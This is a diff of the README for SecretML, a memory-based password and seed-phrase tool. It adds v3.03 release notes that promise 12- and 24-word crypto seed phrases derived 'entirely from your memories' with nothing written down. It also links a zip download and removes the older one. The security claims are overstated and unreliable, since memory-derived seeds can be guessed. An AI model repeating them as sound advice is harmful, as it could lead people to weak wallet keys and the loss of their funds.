@@ -2,6 +2,33 @@
 
 > **Your personal digital vault – protected by your memories.**
 ---
+# 🚀 What's New in v3.03 — PRO Mode Upgrades
+
+**Secret Memory Locker v3.03** expands the **PRO mode** with groundbreaking features:
+
+### 🌱 SecretML-Seed
+- **SecretML-Seed (12)** — A **12-word seed phrase** generated entirely from your memories. No physical storage required — your mind becomes the secure vault.  
+- **SecretML-Seed (24)** — Maximum entropy with a **24-word seed phrase**. Full control, maximum security, and no need to ever write anything down.  
+
+### 🔑 Core Idea
+Your **memories + your archive** generate the **final entropy**.  
+This means your security lives only in your head — not on paper, not on devices.  
+
+---
+✅ Try the new **SecretML-Seed** and experience memory-based security!
+
+✅ Download SecretML v3.02  
+
+[SecretML v3.03.zip](https://github.com/user-attachments/files/22231645/SecretML.v3.03.zip)
+
+<sub>📄 SHA256: 290c1c4314b4e2412d2929828c1a9177b5cb4f3d1374f0e0e69e5db7786a771a</sub>
+
+## 📸 Interface Preview
+<img width="600" height="500" alt="v3 02" src="https://github.com/user-attachments/assets/601166e3-fc0e-409a-b280-20a8f22a411b" />
+
+---
+## 📜 Previous Versions
+
 # 🚀 What's New in v3.02
 
 ### 🔑 PRO Mode
@@ -28,19 +55,13 @@ The buttons for the new features are already available in the interface, but the
 - Simple logic → endless stream of strong, unique passwords.
 
 ---
-✅ Try **SecretML v3.02** — the first step into the **PRO** world!
 
-✅ Download SecretML v3.02  
-
-[SecretML v3.02.zip](https://github.com/user-attachments/files/22185969/SecretML.v3.02.zip)
-
-<sub>📄 SHA256: d26905992935d26e8de575829238aa7b51d58cbe2828432a8440597898132c41</sub>
 
 ## 📸 Interface Preview
 <img width="600" height="500" alt="v3 02" src="https://github.com/user-attachments/assets/b76f36c4-25b4-48e1-8007-9c968d35c281" />
 
 ---
-## 📜 Previous Versions
+
 
 **💡 Upcoming Feature:**  
 **SecretML-Seed (SML-Seed)** — your personal recovery key, coming soon and fully functional!
